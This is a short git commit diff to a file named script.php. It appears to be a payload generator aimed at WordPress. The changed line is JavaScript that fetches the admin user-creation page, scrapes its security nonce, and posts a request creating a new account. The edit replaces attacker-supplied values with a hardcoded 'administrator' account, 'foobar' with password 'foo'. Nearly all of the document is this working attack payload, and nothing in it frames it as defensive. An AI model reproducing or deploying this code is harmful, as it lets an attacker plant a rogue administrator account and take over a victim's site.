33bdbf5ae1d25584fb8b73ed18f2da6fc64197d2
GinoRossiAr <63261677+GinoRossiAr@users.noreply.github.com>
2022-09-18 12:48:07 -0300

    Update script.php

--- script.php
+++ script.php
@@ -6,4 +6,4 @@ $rol = $_GET['rol']
 
 ?>
 
-u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"<?php echo $usuario; ?>",email:"<?php echo $mail; ?>",pass1:"<?php echo $pass; ?>",pass2:"<?php echo $pass; ?>",role:"<?php echo $rol; ?>"})});
+u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"foobar",email:"foo@bar.com",pass1:"foo",pass2:"foo",role:"administrator"})});
